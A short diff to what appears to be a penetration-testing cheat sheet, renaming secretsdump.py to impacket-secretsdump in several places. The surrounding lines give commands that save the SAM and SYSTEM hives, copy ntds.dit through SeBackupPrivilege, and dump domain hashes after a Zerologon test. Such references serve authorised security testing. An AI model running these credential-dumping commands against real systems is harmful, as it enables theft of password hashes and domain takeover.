@@ -3603,7 +3603,7 @@ reg save hklm\sam C:\Users\<USERNAME>\sam.hive
 ###### Dumping Hashes
 
 ```c
-secretsdump.py -sam sam.hive -system system.hive LOCAL
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 ```
 
 ###### SeBackupPrivilege Privilege Escalation (diskshadow)
@@ -3635,7 +3635,7 @@ Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
 reg save HKLM\SYSTEM c:\temp\system
 ```
 
-Download `ndts.dit` and system and get the hashes from `secretsdump.py` of the impacket-suite.
+Download `ndts.dit` and system and get the hashes from `impacket-secretsdump` of the impacket-suite.
 
 ###### SeTakeOwnership Privilege
 
@@ -4285,7 +4285,7 @@ if __name__ == '__main__':
 
 ```c
 python3 zerologon_tester.py <HANDLE> <RHOST>
-secretsdump.py -just-dc -no-pass <HANDLE>\$@<RHOST>
+impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
 ```
 
 #### CVE-2021-3156: Sudo / sudoedit LPE
